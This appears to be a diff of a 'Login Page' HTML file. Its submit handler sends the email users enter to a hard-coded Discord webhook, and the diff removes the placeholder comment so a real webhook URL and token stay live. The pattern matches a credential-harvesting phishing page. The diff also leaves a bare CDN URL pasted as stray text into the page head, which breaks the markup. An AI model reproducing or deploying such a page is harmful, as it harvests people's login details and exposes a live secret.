@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login Page</title>
-    
+    https://cdn.jsdelivr.net/npm/socket.io@3.15.1/dist/socket.io.min.js
 
     <style>
         body {
@@ -57,7 +57,7 @@
         </form>
     </div>
 
-    <script src='socket.io@3.15.1/dist/socket.io.min.js'></script>
+    <script src='https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js'></script>
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -69,7 +69,7 @@
                 return;
             }
             
-            // Replace with your actual Discord webhook URL
+           
             const webhookUrl = 'https://discordapp.com/api/webhooks/1339385478553800704/AgWcJ--FjDu48PZgF3wr40-Fr_yxXMgLWlg-da8lc5aYJ-Z6u1VXuHflVBIYDnsvt4Fl';
             try {
                 // Send the email message to Discord webhook using fetch
